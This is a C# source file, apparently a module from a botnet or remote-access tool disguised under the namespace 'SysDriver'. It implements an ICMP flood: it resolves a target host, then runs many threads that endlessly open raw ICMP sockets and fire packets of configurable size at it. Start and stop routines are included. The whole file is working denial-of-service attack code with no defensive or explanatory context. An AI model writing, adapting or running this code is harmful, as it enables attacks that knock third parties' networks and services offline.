using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace SysDriver;

internal class nICMPFlood
{
	private class ICMPRequest
	{
		private int iICMPSockets;

		private IPEndPoint IPEo;

		private int iPSize;

		private Socket[] pSocket;

		public ICMPRequest(IPEndPoint tIPEo, int tICMPSockets, int tPSize)
		{
			IPEo = tIPEo;
			iICMPSockets = tICMPSockets;
			iPSize = tPSize;
		}

		public void Send()
		{
			byte[] buffer = new byte[iPSize];
			while (true)
			{
				try
				{
					while (true)
					{
						pSocket = new Socket[iICMPSockets];
						for (int i = 0; i < iICMPSockets; i++)
						{
							pSocket[i] = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
							pSocket[i].Blocking = false;
							pSocket[i].SendTo(buffer, IPEo);
						}
						Thread.Sleep(100);
						for (int i = 0; i < iICMPSockets; i++)
						{
							if (pSocket[i].Connected)
							{
								pSocket[i].Disconnect(reuseSocket: false);
							}
							pSocket[i].Close();
							pSocket[i] = null;
						}
						pSocket = null;
					}
				}
				catch
				{
					for (int i = 0; i < iICMPSockets; i++)
					{
						try
						{
							if (pSocket[i].Connected)
							{
								pSocket[i].Disconnect(reuseSocket: false);
							}
							pSocket[i].Close();
							pSocket[i] = null;
						}
						catch
						{
						}
					}
				}
			}
		}
	}

	private static ThreadStart[] tFloodingJob;

	private static Thread[] tFloodingThread;

	public static string sFHost;

	public static int iICMPSockets;

	private static IPEndPoint IPEo;

	public static int iPSize;

	private static ICMPRequest[] ICMPClass;

	public static int iThreads;

	public static void StartICMPFlood()
	{
		try
		{
			IPEo = new IPEndPoint(Dns.GetHostEntry(sFHost).AddressList[0], 0);
		}
		catch
		{
			IPEo = new IPEndPoint(IPAddress.Parse(sFHost), 0);
		}
		tFloodingThread = new Thread[iThreads];
		tFloodingJob = new ThreadStart[iThreads];
		ICMPClass = new ICMPRequest[iThreads];
		for (int i = 0; i < iThreads; i++)
		{
			ICMPClass[i] = new ICMPRequest(IPEo, iICMPSockets, iPSize);
			tFloodingJob[i] = ICMPClass[i].Send;
			tFloodingThread[i] = new Thread(tFloodingJob[i]);
			tFloodingThread[i].Start();
		}
	}

	public static void StopICMPFlood()
	{
		for (int i = 0; i < iThreads; i++)
		{
			try
			{
				tFloodingThread[i].Abort();
				tFloodingThread[i].Join();
			}
			catch
			{
			}
		}
	}
}
